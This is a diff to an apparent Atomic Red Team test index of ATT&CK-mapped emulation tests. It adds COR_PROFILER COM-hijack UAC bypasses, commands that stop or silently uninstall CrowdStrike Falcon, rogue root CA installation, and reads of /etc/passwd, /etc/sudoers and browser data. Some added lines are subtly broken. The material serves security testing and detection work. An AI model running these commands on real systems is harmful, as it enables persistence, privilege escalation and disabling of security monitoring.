@@ -1170,19 +1170,20 @@ persistence:
       - Autoruns Analysis
       identifier: T1122
     atomic_tests:
-    - name: COM Hijack Leveraging .NET profiler DLL
-      description: "Creates environment variables and CLSID to enable a .NET profiler.
-        The profiler DLL (`atomicNotepad.dll`) executes when the CLR is loaded by
-        the Event Viewer process. Additionally, the profiling DLL will inherit the
-        integrity level of Event Viewer bypassing UAC and executing `notepad.exe`
-        with high integrity. If the account used is not a local administrator the
-        profiler DLL will still execute each time the CLR is loaded by a process,
-        however, the notepad process will not execute with high integrity. \n"
+    - name: COM Hijack Leveraging user scope COR_PROFILER
+      description: "Creates user scope environment variables and CLSID COM object
+        to enable a .NET profiler (COR_PROFILER). The unmanaged profiler DLL (`atomicNotepad.dll`)
+        executes when the CLR is loaded by the Event Viewer process. Additionally,
+        the profiling DLL will inherit the integrity level of Event Viewer bypassing
+        UAC and executing `notepad.exe` with high integrity. If the account used is
+        not a local administrator the profiler DLL will still execute each time the
+        CLR is loaded by a process, however, the notepad process will not execute
+        with high integrity. \n"
       supported_platforms:
       - windows
       input_arguments:
         file_name:
-          description: profiler DLL
+          description: unmanaged profiler DLL
           type: Path
           default: PathToAtomicsFolder\T1122\bin\T1122x64.dll
         clsid_guid:
@@ -1207,13 +1208,88 @@ persistence:
           New-ItemProperty -Path HKCU:\Environment -Name "COR_PROFILER_PATH" -PropertyType String -Value #{file_name} -Force | Out-Null
           Write-Host "executing eventvwr.msc" -ForegroundColor Cyan
           START MMC.EXE EVENTVWR.MSC
-          Start-Sleep 5
-        cleanup_command: |-
+        cleanup_command: |
           Write-Host "Removing registry keys" -ForegroundColor Cyan
           Remove-Item -Path "HKCU:\Software\Classes\CLSID\#{clsid_guid}" -Recurse -Force
           Remove-ItemProperty -Path HKCU:\Environment -Name "COR_ENABLE_PROFILING" -Force | Out-Null
           Remove-ItemProperty -Path HKCU:\Environment -Name "COR_PROFILER" -Force | Out-Null
           Remove-ItemProperty -Path HKCU:\Environment -Name "COR_PROFILER_PATH" -Force | Out-Null
+    - name: COM Hijack Leveraging System Scope COR_PROFILER
+      description: "Creates system scope environment variables to enable a .NET profiler
+        (COR_PROFILER). System scope environment variables require a restart to take
+        effect. The unmanaged profiler DLL (`atomicNotepad.dll`) executes when the
+        CLR is loaded by any process. Additionally, the profiling DLL will inherit
+        the integrity level of Event Viewer bypassing UAC and executing `notepad.exe`
+        with high integrity. If the account used is not a local administrator the
+        profiler DLL will still execute each time the CLR is loaded by a process,
+        however, the notepad process will not execute with high integrity. \n"
+      supported_platforms:
+      - windows
+      input_arguments:
+        file_name:
+          description: unmanaged profiler DLL
+          type: Path
+          default: PathToAtomicsFolder\T1122\bin\T1122x64.dll
+        clsid_guid:
+          description: custom clsid guid
+          type: String
+          default: "{09108e71-974c-4010-89cb-acf471ae9e2c}"
+      dependency_executor_name: powershell
+      dependencies:
+      - description: "#{file_name} must be present"
+        prereq_command: 'if (Test-Path #{file_name}) {exit 0} else {exit 1}'
+        get_prereq_command: |-
+          New-Item -Type Directory (split-path #{file_name}) -ErrorAction ignore | Out-Null
+          Invoke-WebRequest "https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1122/bin/T1122x64.dll" -OutFile "#{file_name}"
+      executor:
+        name: powershell
+        elevation_required: true
+        command: |
+          Write-Host "Creating system environment variables" -ForegroundColor Cyan
+          New-ItemProperty -Path 'HKLM:\SYSTEM\CurrentControlSet\Control\Session Manager\Environment' -Name "COR_ENABLE_PROFILING" -PropertyType String -Value "1" -Force | Out-Null
+          New-ItemProperty -Path 'HKLM:\SYSTEM\CurrentControlSet\Control\Session Manager\Environment' -Name "COR_PROFILER" -PropertyType String -Value "#{clsid_guid}" -Force | Out-Null
+          New-ItemProperty -Path 'HKLM:\SYSTEM\CurrentControlSet\Control\Session Manager\Environment' -Name "COR_PROFILER_PATH" -PropertyType String -Value #{file_name} -Force | Out-Null
+        cleanup_command: |
+          Write-Host "Removing system environment variables" -ForegroundColor Cyan
+          Remove-ItemProperty -Path 'HKLM:\SYSTEM\CurrentControlSet\Control\Session Manager\Environment' -Name "COR_ENABLE_PROFILING" -Force | Out-Null
+          Remove-ItemProperty -Path 'HKLM:\SYSTEM\CurrentControlSet\Control\Session Manager\Environment' -Name "COR_PROFILER" -Force | Out-Null
+          Remove-ItemProperty -Path 'HKLM:\SYSTEM\CurrentControlSet\Control\Session Manager\Environment' -Name "COR_PROFILER_PATH" -Force | Out-Null
+    - name: COM Hijack Leveraging registry-free process scope COR_PROFILER
+      description: 'Creates process scope environment variables to enable a .NET profiler
+        (COR_PROFILER) without making changes to the registry. The unmanaged profiler
+        DLL (`atomicNotepad.dll`) executes when the CLR is loaded by PowerShell.
+
+'
+      supported_platforms:
+      - windows
+      input_arguments:
+        file_name:
+          description: unamanged profiler DLL
+          type: Path
+          default: PathToAtomicsFolder\T1122\bin\T1122x64.dll
+        clsid_guid:
+          description: custom clsid guid
+          type: String
+          default: "{09108e71-974c-4010-89cb-acf471ae9e2c}"
+      dependency_executor_name: powershell
+      dependencies:
+      - description: "#{file_name} must be present"
+        prereq_command: 'if (Test-Path #{file_name}) {exit 0} else {exit 1}'
+        get_prereq_command: |-
+          New-Item -Type Directory (split-path #{file_name}) -ErrorAction ignore | Out-Null
+          Invoke-WebRequest "https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1122/bin/T1122x64.dll" -OutFile "#{file_name}"
+      executor:
+        name: powershell
+        elevation_required: false
+        command: |
+          $env:COR_ENABLE_PROFILING = 1
+          $env:COR_PROFILER = '#{clsid_guid}'
+          $env:COR_PROFILER_PATH = '#{file_name}'
+          POWERSHELL -c 'Start-Sleep 1'
+        cleanup_command: |
+          $env:COR_ENABLE_PROFILING = 0
+          $env:COR_PROFILER = ''
+          $env:COR_PROFILER_PATH = ''
   T1136:
     technique:
       x_mitre_permissions_required:
@@ -6496,19 +6572,20 @@ defense-evasion:
       - Autoruns Analysis
       identifier: T1122
     atomic_tests:
-    - name: COM Hijack Leveraging .NET profiler DLL
-      description: "Creates environment variables and CLSID to enable a .NET profiler.
-        The profiler DLL (`atomicNotepad.dll`) executes when the CLR is loaded by
-        the Event Viewer process. Additionally, the profiling DLL will inherit the
-        integrity level of Event Viewer bypassing UAC and executing `notepad.exe`
-        with high integrity. If the account used is not a local administrator the
-        profiler DLL will still execute each time the CLR is loaded by a process,
-        however, the notepad process will not execute with high integrity. \n"
+    - name: COM Hijack Leveraging user scope COR_PROFILER
+      description: "Creates user scope environment variables and CLSID COM object
+        to enable a .NET profiler (COR_PROFILER). The unmanaged profiler DLL (`atomicNotepad.dll`)
+        executes when the CLR is loaded by the Event Viewer process. Additionally,
+        the profiling DLL will inherit the integrity level of Event Viewer bypassing
+        UAC and executing `notepad.exe` with high integrity. If the account used is
+        not a local administrator the profiler DLL will still execute each time the
+        CLR is loaded by a process, however, the notepad process will not execute
+        with high integrity. \n"
       supported_platforms:
       - windows
       input_arguments:
         file_name:
-          description: profiler DLL
+          description: unmanaged profiler DLL
           type: Path
           default: PathToAtomicsFolder\T1122\bin\T1122x64.dll
         clsid_guid:
@@ -6533,13 +6610,88 @@ defense-evasion:
           New-ItemProperty -Path HKCU:\Environment -Name "COR_PROFILER_PATH" -PropertyType String -Value #{file_name} -Force | Out-Null
           Write-Host "executing eventvwr.msc" -ForegroundColor Cyan
           START MMC.EXE EVENTVWR.MSC
-          Start-Sleep 5
-        cleanup_command: |-
+        cleanup_command: |
           Write-Host "Removing registry keys" -ForegroundColor Cyan
           Remove-Item -Path "HKCU:\Software\Classes\CLSID\#{clsid_guid}" -Recurse -Force
           Remove-ItemProperty -Path HKCU:\Environment -Name "COR_ENABLE_PROFILING" -Force | Out-Null
           Remove-ItemProperty -Path HKCU:\Environment -Name "COR_PROFILER" -Force | Out-Null
           Remove-ItemProperty -Path HKCU:\Environment -Name "COR_PROFILER_PATH" -Force | Out-Null
+    - name: COM Hijack Leveraging System Scope COR_PROFILER
+      description: "Creates system scope environment variables to enable a .NET profiler
+        (COR_PROFILER). System scope environment variables require a restart to take
+        effect. The unmanaged profiler DLL (`atomicNotepad.dll`) executes when the
+        CLR is loaded by any process. Additionally, the profiling DLL will inherit
+        the integrity level of Event Viewer bypassing UAC and executing `notepad.exe`
+        with high integrity. If the account used is not a local administrator the
+        profiler DLL will still execute each time the CLR is loaded by a process,
+        however, the notepad process will not execute with high integrity. \n"
+      supported_platforms:
+      - windows
+      input_arguments:
+        file_name:
+          description: unmanaged profiler DLL
+          type: Path
+          default: PathToAtomicsFolder\T1122\bin\T1122x64.dll
+        clsid_guid:
+          description: custom clsid guid
+          type: String
+          default: "{09108e71-974c-4010-89cb-acf471ae9e2c}"
+      dependency_executor_name: powershell
+      dependencies:
+      - description: "#{file_name} must be present"
+        prereq_command: 'if (Test-Path #{file_name}) {exit 0} else {exit 1}'
+        get_prereq_command: |-
+          New-Item -Type Directory (split-path #{file_name}) -ErrorAction ignore | Out-Null
+          Invoke-WebRequest "https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1122/bin/T1122x64.dll" -OutFile "#{file_name}"
+      executor:
+        name: powershell
+        elevation_required: true
+        command: |
+          Write-Host "Creating system environment variables" -ForegroundColor Cyan
+          New-ItemProperty -Path 'HKLM:\SYSTEM\CurrentControlSet\Control\Session Manager\Environment' -Name "COR_ENABLE_PROFILING" -PropertyType String -Value "1" -Force | Out-Null
+          New-ItemProperty -Path 'HKLM:\SYSTEM\CurrentControlSet\Control\Session Manager\Environment' -Name "COR_PROFILER" -PropertyType String -Value "#{clsid_guid}" -Force | Out-Null
+          New-ItemProperty -Path 'HKLM:\SYSTEM\CurrentControlSet\Control\Session Manager\Environment' -Name "COR_PROFILER_PATH" -PropertyType String -Value #{file_name} -Force | Out-Null
+        cleanup_command: |
+          Write-Host "Removing system environment variables" -ForegroundColor Cyan
+          Remove-ItemProperty -Path 'HKLM:\SYSTEM\CurrentControlSet\Control\Session Manager\Environment' -Name "COR_ENABLE_PROFILING" -Force | Out-Null
+          Remove-ItemProperty -Path 'HKLM:\SYSTEM\CurrentControlSet\Control\Session Manager\Environment' -Name "COR_PROFILER" -Force | Out-Null
+          Remove-ItemProperty -Path 'HKLM:\SYSTEM\CurrentControlSet\Control\Session Manager\Environment' -Name "COR_PROFILER_PATH" -Force | Out-Null
+    - name: COM Hijack Leveraging registry-free process scope COR_PROFILER
+      description: 'Creates process scope environment variables to enable a .NET profiler
+        (COR_PROFILER) without making changes to the registry. The unmanaged profiler
+        DLL (`atomicNotepad.dll`) executes when the CLR is loaded by PowerShell.
+
+'
+      supported_platforms:
+      - windows
+      input_arguments:
+        file_name:
+          description: unamanged profiler DLL
+          type: Path
+          default: PathToAtomicsFolder\T1122\bin\T1122x64.dll
+        clsid_guid:
+          description: custom clsid guid
+          type: String
+          default: "{09108e71-974c-4010-89cb-acf471ae9e2c}"
+      dependency_executor_name: powershell
+      dependencies:
+      - description: "#{file_name} must be present"
+        prereq_command: 'if (Test-Path #{file_name}) {exit 0} else {exit 1}'
+        get_prereq_command: |-
+          New-Item -Type Directory (split-path #{file_name}) -ErrorAction ignore | Out-Null
+          Invoke-WebRequest "https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1122/bin/T1122x64.dll" -OutFile "#{file_name}"
+      executor:
+        name: powershell
+        elevation_required: false
+        command: |
+          $env:COR_ENABLE_PROFILING = 1
+          $env:COR_PROFILER = '#{clsid_guid}'
+          $env:COR_PROFILER_PATH = '#{file_name}'
+          POWERSHELL -c 'Start-Sleep 1'
+        cleanup_command: |
+          $env:COR_ENABLE_PROFILING = 0
+          $env:COR_PROFILER = ''
+          $env:COR_PROFILER_PATH = ''
   T1090:
     technique:
       x_mitre_data_sources:
@@ -7247,6 +7399,21 @@ defense-evasion:
         command: 'setenforce 0
 
 '
+    - name: Stop Crowdstrike Falcon on Linux
+      description: 'Stop and disable Crowdstrike Falcon on Linux
+
+'
+      supported_platforms:
+      - linux
+      executor:
+        name: sh
+        elevation_required: true
+        command: |
+          sudo systemctl stop falcon-sensor.service
+          sudo systemctl disable falcon-sensor.service
+        cleanup_command: |
+          sudo systemctl enable falcon-sensor.service
+          sudo systemctl start falcon-sensor.service
     - name: Disable Carbon Black Response
       description: 'Disables Carbon Black Response
 
@@ -7280,6 +7447,28 @@ defense-evasion:
         command: 'sudo launchctl unload /Library/LaunchDaemons/com.opendns.osx.RoamingClientConfigUpdater.plist
 
 '
+    - name: Stop and unload Crowdstrike Falcon on macOS
+      description: 'Stop and unload Crowdstrike Falcon daemons falcond and userdaemon
+        on macOS
+
+'
+      supported_platforms:
+      - macos
+      input_arguments:
+        falcond_plist:
+          description: The path of the Crowdstrike Falcon plist file
+          type: path
+          default: "/Library/LaunchDaemons/com.crowdstrike.falcond.plist"
+        userdaemon_plist:
+          description: The path of the Crowdstrike Userdaemon plist file
+          type: path
+          default: "/Library/LaunchDaemons/com.crowdstrike.userdaemon.plist"
+      executor:
+        name: sh
+        elevation_required: true
+        command: |
+          sudo launchctl unload #{falcond_plist}
+          sudo launchctl unload #{userdaemon_plist}
     - name: Unload Sysmon Filter Driver
       description: |
         Unloads the Sysinternals Sysmon filter driver without stopping the Sysmon service. To verify successful execution, o verify successful execution,
@@ -7548,9 +7737,31 @@ defense-evasion:
       executor:
         name: powershell
         elevation_required: true
-        command: |-
+        command: |
           Stop-Service -Name #{service_name}
           Remove-Service -Name #{service_name}
+    - name: Uninstall Crowdstrike Falcon on Windows
+      description: 'Uninstall Crowdstrike Falcon. If the WindowsSensor.exe path is
+        not provided as an argument we need to search for it. Since the executable
+        is located in a folder named with a random guid we need to identify it before
+        invoking the uninstaller.
+
+'
+      supported_platforms:
+      - windows
+      input_arguments:
+        falcond_path:
+          description: The Crowdstrike Windows Sensor path. The Guid always changes.
+          type: path
+          default: C:\ProgramData\Package Cache\{7489ba93-b668-447f-8401-7e57a6fe538d}\WindowsSensor.exe
+      executor:
+        name: powershell
+        elevation_required: true
+        command: if (Test-Path "#{falcond_path}") {. "#{falcond_path}" /repair /uninstall
+          /quiet } else { Get-ChildItem -Path "C:\ProgramData\Package Cache" -Include
+          "WindowsSensor.exe" -Recurse | % { $sig=$(Get-AuthenticodeSignature -FilePath
+          $_.FullName); if ($sig.Status -eq "Valid" -and $sig.SignerCertificate.DnsNameList
+          -eq "CrowdStrike, Inc.") { . "$_" /repair /uninstall /quiet; break;}}}
   T1107:
     technique:
       x_mitre_data_sources:
@@ -9264,7 +9475,7 @@ defense-evasion:
         name: sh
         command: |
           openssl genrsa -out #{key_filename} 4096
-          openssl req -x509 -new -nodes -key #{key_filename} -sha256 -days 365 -out #{cert_filename}
+          openssl req -x509 -new -nodes -key #{key_filename} -sha256 -days 365 -subj "/C=US/ST=Denial/L=Springfield/O=Dis/CN=www.example.com" -out #{cert_filename}
 
           if [ $(rpm -q --queryformat '%{VERSION}' centos-release) -le "5" ];
           then
@@ -9273,6 +9484,93 @@ defense-evasion:
             cp rootCA.crt /etc/pki/ca-trust/source/anchors/
             update-ca-trust
           fi
+    - name: Install root CA on Debian/Ubuntu
+      description: 'Creates a root CA with openssl
+
+'
+      supported_platforms:
+      - linux
+      input_arguments:
+        key_filename:
+          description: Key we create that is used to create the CA certificate
+          type: Path
+          default: rootCA.key
+        cert_filename:
+          description: CA file name
+          type: Path
+          default: rootCA.crt
+      dependency_executor_name: command_prompt
+      dependencies:
+      - description: Verify the certificate exists. It generates if not on disk.
+        prereq_command: 'if [ -f #{cert_filename} ]; then exit 0; else exit 1; fi;'
+        get_prereq_command: |-
+          if [ ! -f #{key_filename} ]; then openssl genrsa -out #{key_filename} 4096; fi;
+          openssl req -x509 -new -nodes -key #{key_filename} -sha256 -days 365 -subj "/C=US/ST=Denial/L=Springfield/O=Dis/CN=www.example.com" -out #{cert_filename}
+      executor:
+        name: sh
+        elevation_required: true
+        command: |
+          mv #{cert_filename} /usr/local/share/ca-certificates
+          echo sudo update-ca-certificates
+    - name: Install root CA on macOS
+      description: 'Creates a root CA with openssl
+
+'
+      supported_platforms:
+      - macos
+      input_arguments:
+        key_filename:
+          description: Key we create that is used to create the CA certificate
+          type: Path
+          default: rootCA.key
+        cert_filename:
+          description: CA file name
+          type: Path
+          default: rootCA.crt
+      dependency_executor_name: command_prompt
+      dependencies:
+      - description: Verify the certificate exists. It generates if not on disk.
+        prereq_command: 'if [ -f #{cert_filename} ]; then exit 0; else exit 1; fi;'
+        get_prereq_command: |-
+          if [ ! -f #{key_filename} ]; then openssl genrsa -out #{key_filename} 4096; fi;
+          openssl req -x509 -new -nodes -key #{key_filename} -sha256 -days 365 -subj "/C=US/ST=Denial/L=Springfield/O=Dis/CN=www.example.com" -out #{cert_filename}
+      executor:
+        name: command_prompt
+        elevation_required: true
+        command: 'sudo security add-trusted-cert -d -r trustRoot -k "/Library/Keychains/System.keychain"
+          "#{cert_filename}"
+
+'
+    - name: Install root CA on Windows
+      description: 'Creates a root CA with Powershell
+
+'
+      supported_platforms:
+      - windows
+      input_arguments:
+        pfx_path:
+          description: Path of the certificate
+          type: Path
+          default: rootCA.cer
+      dependency_executor_name: powershell
+      dependencies:
+      - description: Verify the certificate exists. It generates if not on disk.
+        prereq_command: 'if (Test-Path #{cert_filename}) { exit 0 } else { exit 1
+          }'
+        get_prereq_command: |-
+          $cert = New-SelfSignedCertificate -DnsName atomicredteam.com -CertStoreLocation cert:\LocalMachine\My
+          Export-Certificate -Type CERT -Cert  Cert:\LocalMachine\My\$cert.Thumbprint -FilePath #{pfx_path}
+          Get-ChildItem Cert:\LocalMachine\My\$($cert.Thumbprint) | Remove-Item
+      executor:
+        name: command_prompt
+        elevation_required: true
+        command: |
+          $cert = Import-Certificate -FilePath #{pfx_path} -CertStoreLocation Cert:\LocalMachine\My
+          Move-Item -Path $cert.PSPath -Destination "Cert:\LocalMachine\Root"
+        cleanup_command: |
+          $cert = Import-Certificate -FilePath #{pfx_path} -CertStoreLocation Cert:\LocalMachine\My
+          Get-ChildItem Cert:\LocalMachine\My\$($cert.Thumbprint) | Remove-Item
+          Get-ChildItem Cert:\LocalMachine\Root\$($cert.Thumbprint) | Remove-Item
   T1118:
     technique:
       x_mitre_data_sources:
@@ -17341,10 +17639,13 @@ discovery:
         output_file:
           description: Path where captured results will be placed
           type: Path
-          default: "~/loot.txt"
+          default: "/tmp/T1087.txt"
       executor:
         name: sh
-        command: 'cat /etc/passwd > #{output_file}
+        command: |
+          cat /etc/passwd > #{output_file}
+          cat #{output_file}
+        cleanup_command: 'rm -f #{output_file}
 
 '
     - name: View sudoers access
@@ -17356,10 +17657,14 @@ discovery:
         output_file:
           description: Path where captured results will be placed
           type: Path
-          default: "~/loot.txt"
+          default: "/tmp/T1087.txt"
       executor:
         name: sh
-        command: 'cat /etc/sudoers > #{output_file}
+        elevation_required: true
+        command: |
+          cat /etc/sudoers > #{output_file}
+          cat #{output_file}
+        cleanup_command: 'rm -f #{output_file}
 
 '
     - name: View accounts with UID 0
@@ -17373,10 +17678,13 @@ discovery:
         output_file:
           description: Path where captured results will be placed
           type: Path
-          default: "~/loot.txt"
+          default: "/tmp/T1087.txt"
       executor:
         name: sh
-        command: 'grep ''x:0:'' /etc/passwd > #{output_file}
+        command: |
+          grep 'x:0:' /etc/passwd > #{output_file}
+          cat #{output_file} 2>/dev/null
+        cleanup_command: 'rm -f #{output_file} 2>/dev/null
 
 '
     - name: List opened files by user
@@ -17401,10 +17709,20 @@ discovery:
         output_file:
           description: Path where captured results will be placed
           type: Path
-          default: "~/loot.txt"
+          default: "/tmp/T1087.txt"
+      dependency_executor_name: sh
+      dependencies:
+      - description: Check if lastlog command exists on the machine
+        prereq_command: if [ -x "$(command -v lastlog)" ]; then exit 0; else exit
+          1;
+        get_prereq_command: echo "Install lastlog on the machine to run the test.";
+          exit 1;
       executor:
         name: sh
-        command: 'lastlog > #{output_file}
+        command: |
+          lastlog > #{output_file}
+          cat #{output_file}
+        cleanup_command: 'rm -f #{output_file}
 
 '
     - name: Enumerate users and groups
@@ -17616,10 +17934,17 @@ discovery:
 '
       supported_platforms:
       - linux
+      input_arguments:
+        output_file:
+          description: Path where captured results will be placed.
+          type: Path
+          default: "/tmp/T1217-Firefox.txt"
       executor:
         name: sh
-        command: 'find / -path "*.mozilla/firefox/*/places.sqlite" -exec echo {} >>
-          /tmp/firefox-bookmarks.txt \;
+        command: |
+          find / -path "*.mozilla/firefox/*/places.sqlite" 2>/dev/null -exec echo {} >> #{output_file} \;
+          cat #{output_file} 2>/dev/null
+        cleanup_command: 'rm -f #{output_file} 2>/dev/null
 
 '
     - name: List Mozilla Firefox Bookmark Database Files on macOS
@@ -17629,10 +17954,17 @@ discovery:
 '
       supported_platforms:
       - macos
+      input_arguments:
+        output_file:
+          description: Path where captured results will be placed.
+          type: Path
+          default: "/tmp/T1217_Firefox.txt"
       executor:
         name: sh
-        command: 'find / -path "*/Firefox/Profiles/*/places.sqlite" -exec echo {}
-          >> /tmp/firefox-bookmarks.txt \;
+        command: |
+          find / -path "*/Firefox/Profiles/*/places.sqlite" -exec echo {} >> #{output_file} \;
+          cat #{output_file} 2>/dev/null
+        cleanup_command: 'rm -f #{output_file} 2>/dev/null
 
 '
     - name: List Google Chrome Bookmark JSON Files on macOS
@@ -17642,10 +17974,17 @@ discovery:
 '
       supported_platforms:
       - macos
+      input_arguments:
+        output_file:
+          description: Path where captured results will be placed.
+          type: Path
+          default: "/tmp/T1217-Chrome.txt"
       executor:
         name: sh
-        command: 'find / -path "*/Google/Chrome/*/Bookmarks" -exec echo {} >> /tmp/chrome-bookmarks.txt
-          \;
+        command: |
+          find / -path "*/Google/Chrome/*/Bookmarks" -exec echo {} >> #{output_file} \;
+          cat #{output_file} 2>/dev/null
+        cleanup_command: 'rm -f #{output_file} 2>/dev/null
 
 '
     - name: List Google Chrome Bookmarks on Windows with powershell
@@ -17998,16 +18337,25 @@ discovery:
       supported_platforms:
       - macos
       - linux
+      input_arguments:
+        output_file:
+          description: Output file used to store the results.
+          type: path
+          default: "/tmp/T1083.txt"
       executor:
         name: sh
         command: |
-          ls -a > allcontents.txt
-          ls -la /Library/Preferences/ > detailedprefsinfo.txt
-          file */* *>> ../files.txt
+          ls -a >> #{output_file}
+          if [ -d /Library/Preferences/ ]; then ls -la /Library/Preferences/ > #{output_file}; fi;
+          file */* *>> #{output_file}
+          cat #{output_file} 2>/dev/null
           find . -type f
           ls -R | grep ":$" | sed -e 's/:$//' -e 's/[^-][^\/]*\//--/g' -e 's/^/ /' -e 's/-/|/'
           locate *
           which sh
+        cleanup_command: 'rm #{output_file}
+
+'
     - name: Nix File and Directory Discovery 2
       description: 'Find or discover files on the file system
 
@@ -18015,13 +18363,20 @@ discovery:
       supported_platforms:
       - macos
       - linux
+      input_arguments:
+        output_file:
+          description: Output file used to store the results.
+          type: path
+          default: "/tmp/T1083.txt"
       executor:
         name: sh
         command: |
-          cd $HOME && find . -print | sed -e 's;[^/]*/;|__;g;s;__|; |;g' > /tmp/loot.txt
-          cat /etc/mtab > /tmp/loot.txt
-          find . -type f -iname *.pdf > /tmp/loot.txt
+          cd $HOME && find . -print | sed -e 's;[^/]*/;|__;g;s;__|; |;g' > #{output_file}
+          if [ -f /etc/mtab ]; then cat /etc/mtab >> #{output_file}; fi;
+          find . -type f -iname *.pdf >> #{output_file}
+          cat #{output_file}; fi;
           find . -type f -name ".*"
+        cleanup_command: 'rm #{output_file}'
   T1046:
     technique:
       x_mitre_permissions_required:
@@ -18113,6 +18468,12 @@ discovery:
           description: Host to scan.
           type: string
           default: 192.168.1.1
+      dependency_executor_name: sh
+      dependencies:
+      - description: Check if nmap command exists on the machine
+        prereq_command: if [ -x "$(command -v nmap)" ]; then exit 0; else exit 1;
+        get_prereq_command: echo "Install nmap on the machine to run the test."; exit
+          1;
       executor:
         name: sh
         command: |
@@ -18620,9 +18981,9 @@ discovery:
       executor:
         name: sh
         command: |
-          dscacheutil -q group
-          dscl . -list /Groups
-          groups
+          if [ -x "$(command -v dscacheutil)" ]; then dscacheutil -q group; else echo "dscacheutil is missing from the machine. skipping..."; fi; fi;
+          if [ -x "$(command -v dscl)" ]; then dscl . -list /Groups; else echo "dscl is missing from the machine. skipping..."; fi;
+          if [ -x "$(command -v groups)" ]; then groups; else echo "groups is missing from the machine. skipping..."; fi;
     - name: Basic Permission Groups Discovery Windows
       description: |
         Basic Permission Groups Discovery for Windows. This test will display some errors if run on a computer not connected to a domain. Upon execution, domain
@@ -18982,6 +19343,11 @@ discovery:
       supported_platforms:
       - linux
       - macos
+      dependency_executor_name: sh
+      dependencies:
+      - description: Check if arp command exists on the machine
+        prereq_command: if [ -x "$(command -v arp)" ]; then exit 0; else exit 1;
+        get_prereq_command: echo "Install arp on the machine."; exit 1;
       executor:
         name: sh
         elevation_required: false
@@ -18995,11 +19361,24 @@ discovery:
       supported_platforms:
       - linux
       - macos
+      input_arguments:
+        subnet:
+          description: Subnet used for ping sweep.
+          type: string
+          default: 192.168.1
+        start_host:
+          description: Subnet used for ping sweep.
+          type: string
+          default: 1
+        stop_host:
+          description: Subnet used for ping sweep.
+          type: string
+          default: 254
       executor:
         name: sh
         elevation_required: false
-        command: 'for ip in $(seq 1 254); do ping -c 1 192.168.1.$ip; [ $? -eq 0 ]
-          && echo "192.168.1.$ip UP" || : ; done
+        command: 'for ip in $(seq #{start_host} #{stop_host}); do ping -c 1 #{subnet}.$ip;
+          [ $? -eq 0 ] && echo "#{subnet}.$ip UP" || : ; done
 
 '
     - name: Remote System Discovery - nslookup
@@ -19300,12 +19679,10 @@ discovery:
 
 '
       supported_platforms:
-      - linux
       - macos
       executor:
         name: sh
         command: |
-          systemsetup
           system_profiler
           ls -al /Applications
     - name: List OS Information
@@ -19315,14 +19692,21 @@ discovery:
       supported_platforms:
       - linux
       - macos
+      input_arguments:
+        output_file:
+          description: Output file used to store the results.
+          type: path
+          default: "/tmp/T1082.txt"
       executor:
         name: sh
-        command: |
-          uname -a >> /tmp/loot.txt
-          cat /etc/lsb-release >> /tmp/loot.txt
-          cat /etc/redhat-release >> /tmp/loot.txt
-          uptime >> /tmp/loot.txt
-          cat /etc/issue >> /tmp/loot.txt
+        command: "uname -a >> #{output_file}\nif [ -f /etc/lsb-release ]; then cat
+          /etc/lsb-release >> #{output_file}; fi;\nif [ -f /etc/redhat-release ];
+          then cat /etc/redhat-release >> #{output_file}; fi;      \nif [ -f /etc/issue
+          ]; then cat /etc/issue >> #{output_file}; fi;\nuptime >> #{output_file}\ncat
+          #{output_file} 2>/dev/null\n"
+        cleanup_command: 'rm #{output_file} 2>/dev/null
+
+'
     - name: Linux VM Check via Hardware
       description: 'Identify virtual machine hardware. This technique is used by the
         Pupy RAT and other malware.
@@ -19333,14 +19717,14 @@ discovery:
       executor:
         name: bash
         command: |
-          cat /sys/class/dmi/id/bios_version | grep -i amazon
-          cat /sys/class/dmi/id/product_name | grep -i "Droplet\|HVM\|VirtualBox\|VMware"
-          cat /sys/class/dmi/id/chassis_vendor | grep -i "Xen\|Bochs\|QEMU"
-          sudo dmidecode | grep -i "microsoft\|vmware\|virtualbox\|quemu\|domu"
-          cat /proc/scsi/scsi | grep -i "vmware\|vbox"
-          cat /proc/ide/hd0/model | grep -i "vmware\|vbox\|qemu\|virtual"
-          sudo lspci | grep -i "vmware\|virtualbox"
-          sudo lscpu | grep -i "Xen\|KVM\|Microsoft"
+          if [ -f /sys/class/dmi/id/bios_version ]; then cat /sys/class/dmi/id/bios_version | grep -i amazon; fi;
+          if [ -f /sys/class/dmi/id/product_name ]; then cat /sys/class/dmi/id/product_name | grep -i "Droplet\|HVM\|VirtualBox\|VMware"; fi;
+          if [ -f /sys/class/dmi/id/product_name ]; then cat /sys/class/dmi/id/chassis_vendor | grep -i "Xen\|Bochs\|QEMU"; fi;
+          if [ -x "$(command -v dmidecode)" ]; then sudo dmidecode | grep -i "microsoft\|vmware\|virtualbox\|quemu\|domu"; fi;
+          if [ -f /proc/scsi/scsi ]; then cat /proc/scsi/scsi | grep -i "vmware\|vbox"; fi;
+          if [ -f /proc/ide/hd0/model ]; then cat /proc/ide/hd0/model | grep -i "vmware\|vbox\|qemu\|virtual"; fi;
+          if [ -x "$(command -v lspci)" ]; then sudo lspci | grep -i "vmware\|virtualbox"
+          if [ -x "$(command -v lscpu)" ]; then sudo lscpu | grep -i "Xen\|KVM\|Microsoft"
     - name: Linux VM Check via Kernel Modules
       description: 'Identify virtual machine guest kernel modules. This technique
         is used by the Pupy RAT and other malware.
@@ -19436,7 +19820,7 @@ discovery:
       modified: '2019-08-12T19:44:26.156Z'
       identifier: T1016
     atomic_tests:
-    - name: System Network Configuration Discovery
+    - name: System Network Configuration Discovery on Windows
       description: |
         Identify network configuration information
 
@@ -19477,9 +19861,10 @@ discovery:
         name: sh
         elevation_required: false
         command: |
-          arp -a
-          netstat -ant | awk '{print $NF}' | grep -v '[a-z]' | sort | uniq -c
-          ifconfig
+          if [ -x "$(command -v arp)" ]; then arp -a; else echo "arp is missing from the machine. skipping..."; fi;
+          if [ -x "$(command -v ifconfig)" ]; then ifconfig; else echo "ifconfig is missing from the machine. skipping..."; fi;
+          if [ -x "$(command -v ip)" ]; then ip addr; else echo "ip is missing from the machine. skipping..."; fi;
+          if [ -x "$(command -v netstat)" ]; then netstat -ant | awk '{print $NF}' | grep -v '[a-z]' | sort | uniq -c; else echo "netstat is missing from the machine. skipping..."; fi;
     - name: System Network Configuration Discovery (TrickBot Style)
       description: |
         Identify network configuration information as seen by Trickbot and described here https://www.sneakymonkey.net/2019/10/29/trickbot-analysis-part-ii/
@@ -19644,6 +20029,12 @@ discovery:
       supported_platforms:
       - linux
       - macos
+      dependency_executor_name: sh
+      dependencies:
